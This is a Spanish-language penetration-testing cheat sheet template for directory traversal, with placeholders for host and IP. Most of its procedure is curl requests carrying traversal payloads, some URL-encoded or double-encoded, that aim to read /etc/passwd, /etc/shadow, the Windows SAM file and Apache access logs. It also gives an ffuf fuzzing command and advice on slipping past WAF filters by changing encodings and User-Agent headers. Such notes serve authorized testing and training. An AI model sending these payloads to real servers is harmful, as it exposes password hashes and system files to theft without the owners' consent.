# CheatSheet: Directory Traversal

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}

---

## Objetivo
Explorar y explotar vulnerabilidades de Directory Traversal para acceder 
a archivos y directorios sensibles fuera del directorio raíz permitido.

---
## Herramientas
1. Burp Suite

2. curl

3. Dirbuster
---
## Procedimiento y comandos
1. Paso 1: Identificar puntos de entrada: Examinar parámetros vulnerables en URLs o formularios:
	
	- **curl -X GET "http://{HOST}/vulnerable?file=../../../etc/passwd"**

2. Paso 2: Probar codificaciones comunes:
	
	- Codificación de URL (por ejemplo, %2e%2e%2f para ../):
	
	- **curl -X GET "http://{HOST}/vulnerable?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"**
	
	- Doble codificación:
	
	- **curl -X GET "http://{HOST}/vulnerable?file=%252e%252e%252fetc%252fpasswd"**

3. Comprobar diferentes sistemas operativos:
	
	- Windows: **curl -X GET "http://{HOST}/vulnerable?file=..\\..\\..\\Windows\\System32\\config\\SAM"**
	
	- Linux: **curl -X GET "http://{HOST}/vulnerable?file=../../../../../etc/shadow"**

4. Automatización: Usar herramientas como Burp Suite con secuencias de ataque en Intruder o fuzzers:

	- ** ffuf -u http://{HOST}/vulnerable?file=FUZZ -w payloads.txt **
---
## Troubleshooting
1. Errores HTTP 403 (Forbidden):

	- Probar diferentes codificaciones para bypass de restricciones, como doble o triple codificación.

	- Asegurarse de que los encabezados HTTP enviados (User-Agent, Referer, etc.) no sean bloqueados por reglas de seguridad del servidor.

	- Verificar si el servidor aplica filtros basados en caracteres o patrones específicos.

2. Archivos inaccesibles por permisos:

	- Intentar acceder a rutas públicas como logs o configuraciones de aplicación:

	- **curl -X GET "http://{HOST}/vulnerable?file=../../../../../var/log/apache2/access.log"**

	- Buscar vulnerabilidades adicionales para escalar privilegios y leer archivos restringidos.

3. Detección de WAF (Web Application Firewall):

	- Usar herramientas como **WAFW00F** para identificar y analizar posibles restricciones.

	- **wafw00f http://{HOST}**

	- Cambiar la estructura de la solicitud o el User-Agent para evitar que sea bloqueada.

4. Sin respuestas úteiles en el contenido devuelto:

	- Comprobar si el servidor devuelve errores genéricos o vacíos. En tal caso, usar **Burp Suite** o herramientas similares para interceptar y analizar más a fondo las respuestas.

	- Analizar si las solicitudes deben incluir **tokens o cookies** específicas para ser procesadas correctamente.
---

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

